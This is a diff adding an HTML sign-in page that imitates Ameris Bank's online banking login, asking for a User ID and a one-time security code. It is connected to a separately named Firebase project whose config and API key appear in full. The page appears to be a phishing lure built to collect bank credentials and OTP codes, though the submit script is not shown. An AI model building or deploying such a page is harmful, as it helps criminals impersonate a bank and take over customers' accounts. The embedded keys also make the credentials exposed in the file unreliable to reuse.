@@ -1,0 +1,63 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Ameris Bank - Sign In</title>
+    <link rel="stylesheet" href="Ameris-user-signin-page-design.css">
+    <!-- Font Awesome for Icons -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+</head>
+<body>
+    <div class="container">
+        <header>
+            <img src="download.png" alt="Ameris Bank Logo" class="logo">
+        </header>
+        <div class="card">
+           
+            <h2>Sign in to Online Banking</h2>
+            <form id="sign-in-form">
+                <div class="input-group">
+                    <label for="user-id">User ID</label>
+                    <!--<input type="text" id="user-id" placeholder="Enter your User ID" required>-->
+                    <input type="text" id="user-id" name="user-id" placeholder="Enter your User ID" required>
+                </div>
+                <div class="input-group">
+                    <label for="security-code">One-Time Security Code</label>
+                    <!--<input type="text" id="security-code" placeholder="Enter Code" required>-->
+                    <input type="password" id="security-code" name="security-code" placeholder="Enter your Security Code" required>
+                </div>
+                <div class="form-buttons">
+                    <button type="submit" class="btn-primary">Continue with Security Code</button>
+                    <button type="button" class="btn-secondary" id="cancel-btn">Cancel</button>
+                    
+                </div>
+            </form>
+            <a href="Ameris-user-signin-page.html" class="alternate">Use a different User ID</a>
+            <p id="error-message" class="error-message"></p>
+        </div>
+    </div>
+    <script src="Ameris-user-signin-page-js.js"></script>
+
+    <script type="module">
+        // Import the functions you need from the SDKs you need
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-app.js";
+        // TODO: Add SDKs for Firebase products that you want to use
+        // https://firebase.google.com/docs/web/setup#available-libraries
+      
+        // Your web app's Firebase configuration
+        const firebaseConfig = {
+          apiKey: "AIzaSyC6jnc3iJhgNpkyRkIJsiJ8pJbtRYznna8",
+          authDomain: "ameris-bank-b9f6a.firebaseapp.com",
+          projectId: "ameris-bank-b9f6a",
+          storageBucket: "ameris-bank-b9f6a.firebasestorage.app",
+          messagingSenderId: "796415015356",
+          appId: "1:796415015356:web:084cc0c08f50a8164893b9"
+        };
+      
+        // Initialize Firebase
+        const app = initializeApp(firebaseConfig);
+      </script>
+
+</body>
+</html>
